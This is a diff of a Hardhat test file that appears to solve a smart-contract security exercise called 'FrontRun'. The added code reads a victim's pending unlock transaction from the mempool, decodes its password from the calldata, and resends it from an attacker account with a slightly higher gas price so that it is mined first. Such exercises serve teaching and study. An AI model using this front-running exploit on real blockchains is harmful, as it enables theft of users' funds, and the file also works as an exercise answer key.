@@ -51,6 +51,29 @@ describe("FrontRun", function () {
   it("EXPLOIT", async function () {
     /** WRITE YOUR EXPLOIT CODE HERE */
     /** END EXPLOIT CODE */
+
+
+    // *** SNIFF PASSWORD ***
+
+    // Get unlock transaction from Alice; must be transaction 0 in pending block
+    const tx = (await network.provider.send("eth_getBlockByNumber", [ "pending", true ])).transactions[0];
+
+    // Get arguments of unlock call from tx data by removing function signature (first 4 bytes) from tx data 
+    const encodedArgs = ethers.utils.hexDataSlice(tx.input, 4);
+
+    // Decode password argument of type "bytes" from unlock call arguments (unlock function has only 1 argument).
+    const passwordHexString = ethers.utils.defaultAbiCoder.decode([ "bytes" ], encodedArgs)[0];
+    const password = ethers.utils.arrayify(passwordHexString);
+
+
+    // *** FRONT-RUN TRANSACTION OF ALICE ***
+
+    // Parse gas price of original unlock transaction and increase it by 1 wei
+    const newGasPrice = ethers.BigNumber.from(tx.gasPrice).add(1);
+
+    // Send attacker unlock transaction to mempool with orignal password and increased gas price
+    // to get included into the next block instead of original transaction 
+    await this.vault.connect(attacker).unlock(password, { gasPrice: newGasPrice });
   });
 
   after(async function () {
